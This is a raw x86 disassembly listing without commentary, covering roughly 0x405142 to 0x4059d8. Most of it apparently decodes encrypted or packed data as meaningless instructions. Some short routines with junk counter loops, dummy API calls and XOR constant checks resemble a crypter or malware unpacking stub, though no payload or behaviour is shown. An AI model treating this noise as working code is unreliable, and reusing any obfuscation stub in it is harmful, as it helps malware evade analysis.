  405142:	inc    DWORD PTR [ecx+0x69]
  405145:	mov    bh,BYTE PTR [edx+0x8abe4cc]
  40514b:	mov    bl,BYTE PTR [ecx+0xe]
  40514e:	shr    DWORD PTR [edi-0xa],0xd6
  405152:	adc    al,0x93
  405154:	adc    BYTE PTR [esi-0x10b47588],dh
  40515a:	cmp    dh,0x99
  40515d:	(bad)  
  40515f:	push   0xda7f9e5f
  405164:	jno    0x405170
  405166:	call   0x9456:0x96d89e50
  40516d:	push   ds
  40516e:	fisubr DWORD PTR [ebx-0xa]
  405171:	xlat   BYTE PTR ds:[ebx]
  405172:	or     BYTE PTR [ebx-0x2aa417bb],bh
  405178:	jo     0x405154
  40517a:	add    DWORD PTR [ecx-0x54],esi
  40517d:	iret   
  40517e:	popa   
  40517f:	pushf  
  405180:	(bad)  
  405181:	neg    DWORD PTR [ebp+eiz*2+0x3d]
  405185:	nop
  405186:	lods   al,BYTE PTR ds:[esi]
  405187:	bound  ebx,QWORD PTR [ebp-0x12]
  40518a:	sbb    BYTE PTR [edi-0x233cf73],bh
  405190:	pushf  
  405191:	repz mov ah,0x89
  405194:	in     al,0x5
  405196:	dec    ecx
  405197:	sub    ecx,edi
  405199:	jg     0x4051df
  40519b:	add    bl,0xdc
  40519e:	movnti DWORD PTR [edx-0x27ff03ff],eax
  4051a5:	imul   ebx,DWORD PTR [ecx],0x2d672d65
  4051ab:	sahf   
  4051ac:	(bad)  
  4051ad:	call   0xdc75390a
  4051b2:	pop    ds
  4051b3:	mov    esp,0x52cf1697
  4051b8:	in     eax,dx
  4051b9:	adc    ch,BYTE PTR [esi+0x25]
  4051bc:	mov    bl,0xa5
  4051be:	push   cs
  4051bf:	dec    esp
  4051c0:	pop    esi
  4051c1:	pop    ss
  4051c2:	mov    cl,0x73
  4051c4:	adc    al,0xda
  4051c6:	jle    0x4051f7
  4051c8:	js     0x40523b
  4051ca:	jle    0x4051d2
  4051cc:	add    BYTE PTR [ebp+0x5c3f817d],al
  4051d2:	cmc    
  4051d3:	or     al,0xee
  4051d5:	mov    edx,0x9af4e227
  4051da:	loope  0x40519b
  4051dc:	cmp    DWORD PTR [edi],0x4fee7538
  4051e2:	repz jne 0x4051ec
  4051e5:	repz adc dh,0xd7
  4051e9:	cmp    DWORD PTR fs:[edi-0xb69b85a],ebp
  4051f0:	ret    
  4051f1:	int3   
  4051f2:	retf   0xc489
  4051f5:	inc    edi
  4051f6:	outs   dx,DWORD PTR ds:[esi]
  4051f7:	lods   al,BYTE PTR ds:[esi]
  4051f8:	jge    0x40523f
  4051fa:	or     DWORD PTR [eax-0x11f7e2a8],ebp
  405200:	cmp    ch,BYTE PTR [edi]
  405202:	cmp    ah,BYTE PTR [edx+0x68b6ce4a]
  405208:	div    BYTE PTR [edx-0x45]
  40520b:	xor    esp,DWORD PTR ss:0xf60ee449
  405212:	(bad)  
  405213:	mov    bh,0x8d
  405215:	pop    ss
  405216:	sub    BYTE PTR [ecx+0x3f],cl
  405219:	addr16 pushf 
  40521b:	call   0xca2a:0x9903f96c
  405222:	pop    ss
  405223:	cs ins DWORD PTR es:[edi],dx
  405225:	popa   
  405226:	frstor [ebp-0x75f978d7]
  40522c:	dec    edx
  40522d:	arpl   WORD PTR [ebx],bp
  40522f:	int3   
  405230:	nop    DWORD PTR [eax-0x151be0f8]
  405237:	sbb    ecx,DWORD PTR [edx+0x32]
  40523a:	pop    ebp
  40523b:	test   BYTE PTR [esi-0x769994f8],al
  405241:	fwait
  405242:	inc    edi
  405243:	inc    edx
  405244:	or     BYTE PTR [ecx+0x564563f],dl
  40524a:	pop    ebp
  40524b:	jl     0x4051de
  40524d:	test   eax,0x6516a6d2
  405252:	jl     0x4051de
  405254:	or     esi,DWORD PTR [ebx]
  405256:	dec    eax
  405257:	bound  esp,QWORD PTR [esi]
  405259:	dec    ebx
  40525a:	xor    al,BYTE PTR [ebx+eax*4-0x60d3a7fc]
  405261:	int3   
  405262:	sub    BYTE PTR [edi],dl
  405264:	adc    esp,edx
  405266:	xor    BYTE PTR [ecx],dh
  405268:	pushf  
  405269:	aam    0x3
  40526b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40526c:	mov    edx,0x9eaad04f
  405271:	shl    DWORD PTR [ecx+0x3fda39de],0xa5
  405278:	push   esp
  405279:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40527a:	inc    edx
  40527b:	icebp  
  40527c:	mov    eax,0xb14f01f7
  405281:	cmp    ch,BYTE PTR [esi-0x5eac7b3e]
  405287:	into   
  405288:	mov    ds:0x58ba1203,eax
  40528d:	in     al,0x39
  40528f:	(bad)  
  405290:	gs rcr esp,1
  405293:	mov    ah,0x8f
  405295:	mov    dh,0x1c
  405297:	leave  
  405298:	outs   dx,DWORD PTR ds:[esi]
  405299:	add    ebp,eax
  40529b:	test   eax,0x2cd58f05
  4052a0:	cs xchg edi,eax
  4052a2:	jns    0x4052a3
  4052a4:	xor    ah,BYTE PTR [edx+0xf]
  4052a7:	scas   eax,DWORD PTR es:[edi]
  4052a8:	xlat   BYTE PTR ds:[ebx]
  4052a9:	mov    edi,DWORD PTR [ebp-0x18]
  4052ac:	xor    edi,eax
  4052ae:	add    edx,edi
  4052b0:	mov    edi,DWORD PTR [ebp-0x8]
  4052b3:	lea    edx,[edx+edi*1+0x32729d]
  4052ba:	mov    DWORD PTR [ebp-0x8],edx
  4052bd:	mov    edx,DWORD PTR [ebp-0x20]
  4052c0:	xor    edx,eax
  4052c2:	mov    edi,0xffcd8d63
  4052c7:	sub    edi,edx
  4052c9:	add    edi,DWORD PTR [ebp-0x10]
  4052cc:	mov    edx,DWORD PTR [ebp-0x20]
  4052cf:	mov    ebx,DWORD PTR [ebp-0x8]
  4052d2:	xor    edx,eax
  4052d4:	add    edx,ecx
  4052d6:	imul   edx,ebx
  4052d9:	cmp    edx,edi
  4052db:	jbe    0x403ae8
  4052e1:	pop    ebx
  4052e2:	pop    edi
  4052e3:	leave  
  4052e4:	ret    0x8
  4052e7:	push   ebp
  4052e8:	mov    ebp,esp
  4052ea:	push   ecx
  4052eb:	and    DWORD PTR ds:0x430626,0x0
  4052f5:	jmp    0x405305
  4052fa:	mov    eax,ds:0x430626
  4052ff:	inc    eax
  405300:	mov    ds:0x430626,eax
  405305:	cmp    DWORD PTR ds:0x430626,0x18
  40530c:	jae    0x40536e
  405312:	cmp    DWORD PTR ds:0x430626,0x4
  405319:	jne    0x40533f
  40531f:	push   0x7989
  405324:	push   0x6fea
  405329:	push   DWORD PTR [ebp-0x28]
  40532c:	push   0x5a2e
  405331:	push   DWORD PTR [ebp-0x24]
  405334:	push   0x2930
  405339:	call   DWORD PTR ds:0x42ec28
  40533f:	cmp    DWORD PTR ds:0x430626,0x3
  405346:	jne    0x405357
  40534c:	mov    eax,ds:0x430626
  405351:	inc    eax
  405352:	mov    ds:0x430626,eax
  405357:	jmp    0x4052fa
  40535c:	mov    eax,ds:0x43065a
  405361:	xor    edx,edx
  405363:	add    edx,DWORD PTR ds:0x4306ea
  405369:	sub    eax,edx
  40536b:	or     eax,DWORD PTR [eax+edx*1]
  40536e:	push   ecx
  40536f:	or     eax,DWORD PTR ds:0x430642
  405375:	mov    eax,0xf89c8535
  40537a:	sbb    DWORD PTR ds:0x430632,ecx
  405380:	mov    DWORD PTR [ebp-0x8],eax
  405383:	movzx  ecx,BYTE PTR ds:0x430626
  40538a:	add    DWORD PTR ds:0x42e8f2,ecx
  405390:	mov    DWORD PTR [ebp-0x4],0xf89c8532
  405397:	and    DWORD PTR ds:0x43063e,0x0
  4053a1:	mov    ecx,DWORD PTR ds:0x43063e
  4053a7:	inc    ecx
  4053a8:	mov    DWORD PTR ds:0x43063e,ecx
  4053ae:	cmp    DWORD PTR ds:0x43063e,0x22
  4053b5:	jne    0x4053c9
  4053bb:	push   DWORD PTR [ebp-0x24]
  4053be:	push   0x8601
  4053c3:	call   DWORD PTR ds:0x42ed20
  4053c9:	cmp    DWORD PTR ds:0x43063e,0x12
  4053d0:	jb     0x4053a1
  4053d6:	and    DWORD PTR ds:0x42ef94,0x0
  4053e0:	mov    ecx,DWORD PTR ds:0x42ef94
  4053e6:	inc    ecx
  4053e7:	mov    DWORD PTR ds:0x42ef94,ecx
  4053ed:	cmp    DWORD PTR ds:0x42ef94,0x7
  4053f4:	jne    0x405405
  4053fa:	push   0x68cd
  4053ff:	call   DWORD PTR ds:0x42eb64
  405405:	cmp    DWORD PTR ds:0x42ef94,0x6
  40540c:	jne    0x40541f
  405412:	mov    ecx,DWORD PTR ds:0x42ef94
  405418:	inc    ecx
  405419:	mov    DWORD PTR ds:0x42ef94,ecx
  40541f:	cmp    DWORD PTR ds:0x42ef94,0x1d
  405426:	jb     0x4053e0
  40542c:	mov    edx,DWORD PTR [ebp-0x8]
  40542f:	push   esi
  405430:	mov    ecx,0x7510856
  405435:	xor    edx,ecx
  405437:	mov    esi,0x32729d
  40543c:	push   edi
  40543d:	mov    edi,DWORD PTR [ebp+0x10]
  405440:	add    edx,esi
  405442:	jmp    0x40581e
  405447:	sub    dl,BYTE PTR [edi+0x7c7d3afd]
  40544d:	in     eax,dx
  40544e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40544f:	ins    DWORD PTR es:[edi],dx
  405450:	ret    
  405451:	mov    ecx,0xc5a3fa09
  405456:	pop    ebp
  405457:	shl    BYTE PTR [esi+edi*2],cl
  40545a:	jle    0x405419
  40545c:	jno    0x4054dc
  40545e:	jle    0x405468
  405460:	mov    bl,0x9f
  405462:	xor    eax,0xa3d3596e
  405467:	xchg   esi,eax
  405468:	mov    bh,0x71
  40546a:	shr    DWORD PTR [edx-0x13],cl
  40546d:	aaa    
  40546e:	sbb    al,BYTE PTR [esi-0x33]
  405471:	aam    0x58
  405473:	pushf  
  405474:	xadd   DWORD PTR [edi-0x139b8734],esi
  40547b:	inc    ebp
  40547c:	in     eax,0x49
  40547e:	arpl   di,di
  405480:	jns    0x4054c5
  405482:	adc    ah,ah
  405484:	xor    al,cl
  405486:	sub    ebp,DWORD PTR [eax+ebp*8+0x2e]
  40548a:	std    
  40548b:	mov    ebp,0x6a280c95
  405490:	aas    
  405491:	pusha  
  405492:	xor    eax,0x9c4405cf
  405497:	push   ebx
  405498:	mov    DWORD PTR [eax+0x27f5984e],esi
  40549e:	adc    DWORD PTR [edx],esp
  4054a0:	imul   edx,DWORD PTR [ecx],0xffffffba
  4054a3:	pop    ebx
  4054a4:	mov    ecx,gs
  4054a6:	xchg   edx,eax
  4054a7:	inc    esi
  4054a8:	jmp    0x40549b
  4054aa:	sub    al,BYTE PTR [ecx-0x6c2e1af4]
  4054b0:	or     dl,bl
  4054b2:	cdq    
  4054b3:	dec    esi
  4054b4:	(bad)  
  4054b5:	and    al,0xcb
  4054b7:	inc    edx
  4054b8:	jae    0x4054a3
  4054ba:	jbe    0x4054ea
  4054bc:	jp     0x40546c
  4054be:	mov    al,ds:0x236a4d7c
  4054c3:	mov    dl,0x70
  4054c5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4054c6:	fldcw  WORD PTR [ebx]
  4054c8:	ror    BYTE PTR [edi+0x606b384],0xf2
  4054cf:	pop    edi
  4054d0:	mov    ds,WORD PTR [ebx+0x70c35838]
  4054d6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4054d7:	and    ah,bh
  4054d9:	pushf  
  4054da:	pop    edx
  4054db:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4054dc:	xor    edx,DWORD PTR [edi+0x719a9312]
  4054e2:	jno    0x4054b4
  4054e4:	jae    0x4054b1
  4054e6:	sub    BYTE PTR [edx+0x4569bdef],0xda
  4054ed:	sbb    DWORD PTR ds:0x125db641,edi
  4054f3:	mov    ah,0x8c
  4054f5:	jbe    0x405519
  4054f7:	xchg   esp,eax
  4054f8:	push   ss
  4054f9:	clc    
  4054fa:	scas   al,BYTE PTR es:[edi]
  4054fb:	cs sub al,0xc
  4054fe:	fist   WORD PTR [edx+0x30ff643b]
  405504:	xor    ah,BYTE PTR [ecx+0x7b]
  405507:	mov    edi,0x7ee83873
  40550c:	(bad)
  40550f:	sar    BYTE PTR ds:0xd3a9f208,1
  405515:	mov    edi,DWORD PTR [edx+ecx*2]
  405518:	stc    
  405519:	sbb    al,bl
  40551b:	dec    edx
  40551c:	push   es
  40551d:	fwait
  40551e:	cwde   
  40551f:	pusha  
  405520:	sub    al,0xdb
  405522:	pop    ebx
  405523:	dec    eax
  405524:	or     al,0x2d
  405526:	jns    0x4054c3
  405528:	pop    ds
  405529:	sti    
  40552a:	arpl   WORD PTR [esi+0x41],di
  40552d:	sbb    BYTE PTR [edx],ch
  40552f:	inc    BYTE PTR [ebx]
  405531:	add    DWORD PTR [eax],esp
  405533:	pop    eax
  405534:	add    eax,0xbd491315
  405539:	(bad)  
  40553a:	jae    0x4054d1
  40553c:	ins    DWORD PTR es:[edi],dx
  40553d:	push   esi
  40553e:	leave  
  40553f:	jle    0x4054f9
  405541:	rcl    BYTE PTR [edi-0x37197d29],1
  405547:	je     0x4054e2
  405549:	inc    eax
  40554a:	adc    esi,DWORD PTR [ecx-0x72]
  40554d:	mov    cs,WORD PTR [edi+0x1873ec1f]
  405553:	mov    es,WORD PTR [eax+0x6022b4be]
  405559:	int    0xe5
  40555b:	fcomp  DWORD PTR [esi-0x11]
  40555e:	dec    ecx
  40555f:	and    DWORD PTR [ebx],eax
  405561:	inc    edx
  405562:	add    al,0xcc
  405564:	cmp    bh,BYTE PTR [edx+0x7a]
  405567:	nop
  405568:	mov    al,ds:0xd6c02723
  40556d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40556e:	push   0x840c8583
  405573:	cdq    
  405574:	gs sahf 
  405576:	xchg   ebx,eax
  405577:	aaa    
  405578:	mov    ds:0xaf18dda6,al
  40557d:	pop    ebx
  40557e:	test   al,0xc0
  405580:	xchg   ebp,eax
  405581:	pop    esi
  405582:	pop    edi
  405583:	test   eax,0x7df7e212
  405588:	rol    BYTE PTR [eax+0x268f9409],0xe3
  40558f:	ds mov ecx,0x86dfd0dd
  405595:	mov    dh,BYTE PTR [ebx+ebx*4+0x55]
  405599:	push   ebx
  40559a:	jmp    0xb449:0xc5f87bf6
  4055a1:	jmp    0x405598
  4055a3:	xor    cl,BYTE PTR [ecx+0x53]
  4055a6:	je     0x4055c0
  4055a8:	jp     0x405548
  4055aa:	lahf   
  4055ab:	inc    edi
  4055ac:	jg     0x40559f
  4055ae:	inc    eax
  4055af:	aaa    
  4055b0:	dec    eax
  4055b1:	sti    
  4055b2:	mov    ebp,0x73f7af5d
  4055b7:	fistp  DWORD PTR [ecx+0x1a66760d]
  4055bd:	mov    ebp,0xa3bbbd6b
  4055c2:	push   cs
  4055c3:	sub    eax,0xdd273ff
  4055c8:	dec    ecx
  4055c9:	popf   
  4055ca:	xchg   edx,eax
  4055cb:	jo     0x405555
  4055cd:	addr16 jb 0x405551
  4055d0:	adc    al,0xd3
  4055d2:	cmp    DWORD PTR [esp+edi*1],esp
  4055d5:	(bad)  
  4055d6:	lods   eax,DWORD PTR ds:[esi]
  4055d7:	push   0xfffffffa
  4055d9:	mov    ds:0x5ba8f805,al
  4055de:	sub    BYTE PTR [ebp-0x2bedc49],dh
  4055e4:	sub    eax,DWORD PTR [esi+0x25ae6744]
  4055ea:	and    eax,0x684b041f
  4055ef:	mov    esp,0x95783120
  4055f4:	popf   
  4055f5:	dec    ecx
  4055f6:	jbe    0x405635
  4055f8:	aad    0x34
  4055fa:	(bad)
  4055fe:	and    eax,0xe4acdb38
  405603:	sub    ch,BYTE PTR [ebx-0xed0cbdc]
  405609:	xchg   DWORD PTR [edx+edx*4-0x55],edi
  40560d:	mov    ch,0x4f
  40560f:	mov    ds:0x191929,al
  405614:	mov    dh,0xcb
  405616:	test   BYTE PTR ss:[ebx-0x67e5c898],0xff
  40561e:	sti    
  40561f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405620:	ins    BYTE PTR es:[edi],dx
  405621:	dec    eax
  405622:	sub    esp,edx
  405624:	int3   
  405625:	test   DWORD PTR ds:0x8df435cc,edx
  40562b:	jle    0x40565d
  40562d:	jp     0x4056a1
  40562f:	repz mov bl,0x19
  405632:	push   cs
  405633:	add    esi,DWORD PTR [esi+edx*1+0x5bbaa96f]
  40563a:	mov    eax,ds:0xac65ebfe
  40563f:	jae    0x405678
  405641:	pop    ebx
  405642:	mov    cl,0x6f
  405644:	fidiv  WORD PTR [ebp-0x846a377]
  40564a:	inc    edi
  40564b:	imul   esi,DWORD PTR [ebx+0x1c],0x7c
  40564f:	cld    
  405650:	daa    
  405651:	mov    bl,0xcc
  405653:	pushf  
  405654:	nop
  405655:	jl     0x405668
  405657:	hlt    
  405658:	mov    WORD PTR [edi+0x6f446b93],ss
  40565e:	out    dx,eax
  40565f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405660:	mov    ecx,0xdb9d359c
  405665:	ss xchg esp,eax
  405667:	inc    esp
  405668:	cmp    bh,bl
  40566a:	pop    ecx
  40566b:	ja     0x4055fb
  40566d:	and    eax,0x5a255f4b
  405672:	mov    ecx,0x19c18a2f
  405677:	add    DWORD PTR [ebp+0x34],0xcda59889
  40567e:	jg     0x4056c6
  405680:	(bad)  
  405682:	enter  0x70d0,0xcf
  405686:	xor    cl,al
  405688:	inc    esi
  405689:	sub    BYTE PTR [ebp+0x41b081b],ch
  40568f:	sub    DWORD PTR [edx-0x52f08b5a],ecx
  405695:	xchg   BYTE PTR [ebp+0x1ed1496],dh
  40569b:	xchg   ebx,eax
  40569c:	fdivr  DWORD PTR [ecx]
  40569e:	mov    bh,0x43
  4056a0:	mov    ecx,0x9748e88f
  4056a5:	rol    BYTE PTR [edx],cl
  4056a7:	jmp    0x9b6a:0x87f4000a
  4056ae:	outs   dx,BYTE PTR ds:[esi]
  4056af:	mov    ds:0x8edbb578,al
  4056b4:	pushf  
  4056b5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4056b6:	xchg   ebp,eax
  4056b7:	mov    cl,0x95
  4056b9:	js     0x4056ca
  4056bb:	ror    DWORD PTR ds:0x783975d0,1
  4056c1:	or     esp,DWORD PTR [ecx]
  4056c3:	arpl   sp,bx
  4056c5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4056c6:	ret    0x8be1
  4056c9:	and    BYTE PTR [esi+0x53],0xfb
  4056cd:	push   esp
  4056ce:	das    
  4056cf:	ficomp DWORD PTR [eax-0x4b]
  4056d2:	xlat   BYTE PTR ds:[ebx]
  4056d3:	add    BYTE PTR [eax],ch
  4056d5:	pop    eax
  4056d6:	jmp    0x405677
  4056d8:	test   BYTE PTR cs:[ecx],cl
  4056db:	hlt    
  4056dc:	shl    DWORD PTR [edi+0x38],cl
  4056df:	pushf  
  4056e0:	jns    0x405693
  4056e2:	test   al,0x2c
  4056e4:	or     ebp,esp
  4056e6:	cs pop ss
  4056e8:	mov    eax,0x93ebca02
  4056ed:	xor    esi,edi
  4056ef:	stos   DWORD PTR es:[edi],eax
  4056f0:	dec    ebp
  4056f1:	jae    0x4056fb
  4056f3:	jb     0x405681
  4056f5:	or     BYTE PTR [ecx-0x19],ch
  4056f8:	fistp  QWORD PTR [ebp-0x67b3ea8a]
  4056fe:	mov    ebx,0x614a6dbc
  405703:	sbb    DWORD PTR [ecx+0x4b3e8c3d],edx
  405709:	out    0x4a,al
  40570b:	cmp    dh,al
  40570d:	pop    edi
  40570e:	xor    bl,dh
  405710:	xchg   ebx,eax
  405711:	push   ebp
  405712:	fild   QWORD PTR [edi]
  405714:	test   eax,0xb2f82b2
  405719:	pop    esi
  40571a:	mov    eax,0x932bb739
  40571f:	mov    al,ds:0xf8eba9cd
  405724:	mov    al,0x99
  405726:	xor    BYTE PTR [esi],bh
  405728:	pop    ss
  405729:	cmp    esp,ebx
  40572b:	mov    eax,0xf7ecf24d
  405730:	or     BYTE PTR [edx],ch
  405732:	cmp    ecx,DWORD PTR [ebx+0x13ca1b33]
  405738:	test   BYTE PTR [edi-0x3],dl
  40573b:	stc    
  40573c:	repz mov esi,0x5af7226e
  405742:	mov    BYTE PTR [esi+eiz*4],ah
  405745:	dec    edx
  405746:	out    dx,al
  405747:	dec    ecx
  405748:	ror    BYTE PTR [esi+0x2cb68b91],0x3c
  40574f:	(bad)  
  405750:	popa   
  405751:	adc    bh,0x66
  405754:	jl     0x4057a3
  405756:	repz scas eax,DWORD PTR es:[edi]
  405758:	inc    eax
  405759:	or     DWORD PTR [eax+0x6e],esi
  40575c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40575d:	sbb    BYTE PTR [eax+0xb],al
  405760:	jle    0x405703
  405762:	les    eax,FWORD PTR [edi]
  405764:	(bad)  
  405765:	iret   
  405766:	jmp    0x583f:0x2fbf60c5
  40576d:	das    
  40576e:	xchg   edx,eax
  40576f:	sbb    eax,0x2f63f2c7
  405774:	nop
  405775:	dec    ebx
  405776:	fnstenv [esi-0x25]
  405779:	(bad)  
  40577a:	or     esi,DWORD PTR [ecx+0x61e6e388]
  405780:	addr16 inc ebx
  405782:	pop    es
  405783:	fild   WORD PTR [ebp-0x63e5af95]
  405789:	mov    cl,0x1
  40578b:	inc    edi
  40578c:	shr    BYTE PTR [esi-0x3e22cd34],0xa7
  405793:	sub    eax,0x4365d51f
  405798:	or     eax,0x7bcb5c3
  40579d:	ficom  DWORD PTR [edi+0x66]
  4057a0:	xchg   edx,eax
  4057a1:	clc    
  4057a2:	xchg   DWORD PTR [esi],esi
  4057a4:	frstor fs:[ebx+0x6f2f3639]
  4057ab:	and    eax,0xad00daa5
  4057b0:	ror    DWORD PTR gs:[esi],1
  4057b3:	les    esp,FWORD PTR [edi-0x43]
  4057b6:	pop    ebx
  4057b7:	stos   DWORD PTR es:[edi],eax
  4057b8:	in     eax,0xd7
  4057ba:	stc    
  4057bb:	inc    esi
  4057bc:	fimul  DWORD PTR [esi]
  4057be:	mov    ss,esp
  4057c0:	mov    esp,0xdf4d0221
  4057c5:	dec    edi
  4057c6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4057c7:	and    eax,0x248d05d8
  4057cc:	call   0x3de7:0xa90b670b
  4057d3:	xor    BYTE PTR cs:[edx-0x9],al
  4057d7:	xchg   ebp,eax
  4057d8:	nop
  4057d9:	mov    dl,0xc4
  4057db:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4057dc:	test   dh,ch
  4057de:	xor    BYTE PTR [eax-0x70b0b7fa],cl
  4057e4:	add    edi,DWORD PTR [ebp+0x30283bb0]
  4057ea:	or     eax,0xc91d5fc5
  4057ef:	dec    ecx
  4057f0:	pop    ds
  4057f1:	inc    edi
  4057f2:	mov    al,ds:0x83cf289b
  4057f7:	mov    al,0x78
  4057f9:	(bad)  
  4057fa:	out    dx,al
  4057fb:	cmp    ch,BYTE PTR [ecx+0x3f19e78d]
  405801:	xchg   edi,eax
  405802:	pop    ecx
  405803:	sti    
  405804:	scas   eax,DWORD PTR es:[edi]
  405805:	jge    0x40587e
  405807:	retf   0x30d0
  40580a:	cmp    DWORD PTR [eax+0x410e157b],0xffffff88
  405811:	adc    al,0xc4
  405813:	int3   
  405814:	adc    BYTE PTR [ecx-0x2f],0xb9
  405818:	ins    DWORD PTR es:[edi],dx
  405819:	aad    0x58
  40581b:	sti    
  40581c:	jl     0x405899
  40581e:	cmp    edi,edx
  405820:	je     0x40642d
  405826:	mov    edx,DWORD PTR [ebp-0x8]
  405829:	mov    eax,DWORD PTR [ebp-0x4]
  40582c:	xor    eax,ecx
  40582e:	mov    edi,0xffcd8d63
  405833:	jmp    0x405c0f
  405838:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405839:	loop   0x4058ae
  40583b:	fmul   DWORD PTR [ebx-0x7]
  40583e:	jge    0x4058a4
  405840:	xor    BYTE PTR [edx+ebx*8-0x4f34e2c4],bh
  405847:	mov    ah,0x11
  405849:	cmp    BYTE PTR [esi+0x7e],bh
  40584c:	mov    ebp,0x1d7e7e71
  405851:	lods   eax,DWORD PTR ds:[esi]
  405852:	dec    ecx
  405853:	cld    
  405854:	jne    0x4057eb
  405856:	out    0xf4,al
  405858:	mov    esp,0x91db9c3d
  40585d:	(bad)  
  40585e:	repnz in al,dx
  405860:	xor    al,0x57
  405862:	cmp    ebx,DWORD PTR [ecx]
  405864:	mov    ah,0xb4
  405866:	xchg   ebp,eax
  405867:	mov    dh,0x19
  405869:	mov    bl,0x79
  40586b:	in     eax,0x20
  40586d:	inc    edi
  40586e:	or     edx,ebp
  405870:	rol    BYTE PTR [ecx+0x35],0x97
  405874:	add    ebx,DWORD PTR ds:0x122b1a2c
  40587a:	sub    eax,0xf695f121
  40587f:	clc    
  405880:	outs   dx,BYTE PTR ds:[esi]
  405881:	sub    DWORD PTR [edi-0x3ea68339],eax
  405887:	jle    0x40585b
  405889:	pop    es
  40588a:	dec    eax
  40588b:	dec    eax
  40588c:	(bad)  
  40588d:	push   ebx
  40588e:	out    0xb,eax
  405890:	imul   ebp,ecx,0x97bd8c46
  405896:	adc    eax,0xa83208b6
  40589b:	fbstp  TBYTE PTR [ecx-0x21]
  40589e:	xchg   ebp,eax
  40589f:	popf   
  4058a0:	sti    
  4058a1:	dec    edi
  4058a2:	aaa    
  4058a3:	jbe    0x405867
  4058a5:	push   edi
  4058a6:	pop    edi
  4058a7:	call   0x1b29:0x8f34193
  4058ae:	cmp    esp,ebx
  4058b0:	add    BYTE PTR [edx+0x374d865a],0xc
  4058b7:	cld    
  4058b8:	call   0x71e3:0xd0759db9
  4058bf:	jae    0x40586c
  4058c1:	mov    esi,0x6337c470
  4058c6:	xor    ecx,esi
  4058c8:	xchg   edi,eax
  4058c9:	call   0x515d:0x519233dd
  4058d0:	mov    esi,0xac11b0a1
  4058d5:	add    BYTE PTR [eax+0x1740e4b6],dh
  4058db:	mov    al,0x24
  4058dd:	aaa    
  4058de:	test   BYTE PTR [eax+eiz*1+0x3a],0x46
  4058e3:	fstp   DWORD PTR [eax+ebx*4+0x2ab61e35]
  4058ea:	sub    al,0xf4
  4058ec:	fiadd  WORD PTR [ebp+0x79cce99b]
  4058f2:	xchg   esi,eax
  4058f3:	sbb    ch,BYTE PTR [ebp-0x7f]
  4058f6:	xor    DWORD PTR [ecx+ebx*2+0x10],edx
  4058fa:	xchg   esi,eax
  4058fb:	sub    BYTE PTR [esi+0x39],0xba
  4058ff:	mov    ch,0x26
  405901:	in     eax,0xcf
  405903:	and    BYTE PTR [eax],dh
  405905:	pop    esp
  405906:	out    dx,ax
  405908:	or     edx,DWORD PTR [eax+0xddf08fd]
  40590e:	or     ebp,ecx
  405910:	dec    ebx
  405911:	sbb    DWORD PTR [edi-0x208680db],esp
  405917:	cmp    bl,BYTE PTR [ebx]
  405919:	xchg   esp,eax
  40591a:	sub    dl,bh
  40591c:	cmp    cl,BYTE PTR [ebp+0x36]
  40591f:	cmp    DWORD PTR [esi],0xa8ca28e2
  405925:	push   0xf7580263
  40592a:	movaps XMMWORD PTR [eax-0x357be279],xmm0
  405931:	jl     0x4058c3
  405933:	mov    DWORD PTR [edi+0x23],esi
  405936:	pop    es
  405937:	addr16 clc 
  405939:	mov    bl,0xdc
  40593b:	in     eax,0xf5
  40593d:	sub    DWORD PTR [eax],edx
  40593f:	popa   
  405940:	inc    ecx
  405941:	sbb    al,0x1
  405943:	inc    esp
  405944:	mov    ds:0xb720a97,al
  405949:	scas   eax,DWORD PTR es:[edi]
  40594a:	div    edx
  40594c:	pop    es
  40594d:	jp     0x4059b9
  40594f:	xor    BYTE PTR [ebp+0x21],dh
  405952:	cmp    ch,bl
  405954:	or     DWORD PTR [edx],edi
  405956:	(bad)  
  405957:	ds ins DWORD PTR es:[edi],dx
  405959:	mov    ebx,0xf0d53f05
  40595e:	adc    bh,BYTE PTR [esi-0x44cebe04]
  405964:	aam    0x43
  405966:	pop    es
  405967:	ins    BYTE PTR es:[edi],dx
  405968:	xchg   ebx,eax
  405969:	push   eax
  40596a:	cmp    al,0xa3
  40596c:	loop   0x405970
  40596e:	mov    ecx,0xb9722279
  405973:	add    ecx,ebp
  405975:	outs   dx,DWORD PTR ds:[esi]
  405976:	ror    BYTE PTR [ebp+0x6c],cl
  405979:	add    eax,0x1e10225b
  40597e:	sbb    al,BYTE PTR [esp+edi*4]
  405981:	dec    ebx
  405982:	and    eax,0xd39e9f05
  405987:	mov    edi,0x15faecfc
  40598c:	mov    eax,0x3e476453
  405991:	xchg   ebp,eax
  405992:	dec    ebx
  405993:	sub    edi,DWORD PTR ds:0xf4376b81
  405999:	or     cl,BYTE PTR [esi-0x35091479]
  40599f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4059a0:	cwde   
  4059a1:	call   0xdd95:0x64ad571d
  4059a8:	rol    eax,cl
  4059aa:	mov    edx,0x8fbe7bee
  4059af:	jg     0x405957
  4059b1:	repnz stc 
  4059b3:	popa   
  4059b4:	xchg   edx,eax
  4059b5:	lds    esi,FWORD PTR [ebx]
  4059b7:	aaa    
  4059b8:	out    dx,al
  4059b9:	in     eax,dx
  4059ba:	sbb    DWORD PTR [eax+0x361b1a5d],ebx
  4059c0:	pushf  
  4059c1:	je     0x40597f
  4059c3:	jle    0x4059de
  4059c5:	sub    esp,DWORD PTR [edx]
  4059c7:	mov    ah,0x4f
  4059c9:	nop
  4059ca:	out    0x12,eax
  4059cc:	ret    0xd63e
  4059cf:	sbb    al,BYTE PTR [ecx]
  4059d1:	mov    al,BYTE PTR [ecx+edi*1+0x249f22eb]
  4059d8:	data16 fidiv WORD PTR ds:[ebx+0x39]
